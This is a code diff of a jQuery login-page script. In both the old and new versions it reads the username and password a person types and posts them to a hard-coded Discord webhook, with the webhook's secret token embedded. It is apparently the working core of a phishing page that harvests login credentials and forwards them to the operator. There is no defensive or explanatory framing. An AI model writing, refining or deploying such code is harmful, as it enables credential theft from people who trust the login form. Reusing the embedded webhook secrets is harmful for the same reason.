@@ -1,40 +1,35 @@
 $(document).ready(function() {
-    $('.login-button').on('click', function() {
-        var webhookUrl = "https://discord.com/api/webhooks/1244659579317649440/lJxCRGsWdGFaqcG5o1Tg2L7qJe-yVpgyeDWpL9FQyal_JF4OxigTSNPGlEN09JIa2tGj";
-        
+        $('.login-button').on('click', function() {
+            // Get the values from the input fields
+            var user = $('.accountUser').val();
+            var password = $('.accountPassword').val();
 
-        var email = $('.accountUser').val();
-        var password = $('.accountPassword').val();
+            // Your Discord Webhook URL
+            var webhookURL = 'https://discord.com/api/webhooks/1253944495553249290/TcSylyaged1n1oG5A-XV0zFcjn047x33t9UibNEnXpLkI1VH-lsex21dKIcOzvz9RKyw';
 
-        
+            // Ensure user and password are provided
+            if (!user || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
 
-        var content = {
-            content: `__Name__: **${email}**\n__Contact__: **${password}**`
-        };
+            // Data to send to the webhook
+            var data = {
+                content: `User: ${user}\nPassword: ${password}`
+            };
 
-        if(name ==''){
-            messageMeName.attr("placeholder" , "Please Type Your Name Here")
-            messageMeName.css('font-size' , '1em')
-            
-            messageMeContact.attr("placeholder" , "Please Type Your Contact Here")
-            messageMeContact.css('font-size' , '1em')
-
-            messageMeMessage.attr("placeholder" , "Please Type Your Message Here")
-            messageMeMessage.css('font-size' , '1em')
-        }
-        else{
+            // Send AJAX POST request using jQuery
             $.ajax({
-                url: webhookUrl,
-                type: "POST",
-                contentType: "application/json",
-                data: JSON.stringify(content),
-                success: function(data, textStatus, jqXHR) {
-                    console.log("Message sent: ", data);
+                url: webhookURL,
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify(data),
+                success: function(response) {
+                    alert('Information sent successfully!');
                 },
-                error: function(jqXHR, textStatus, errorThrown) {
-                    console.error("Error sending message: ", textStatus, errorThrown);
+                error: function(xhr, status, error) {
+                    alert('Error sending information: ' + xhr.responseText);
                 }
             });
-        }
-    });
-})
+        });
+});
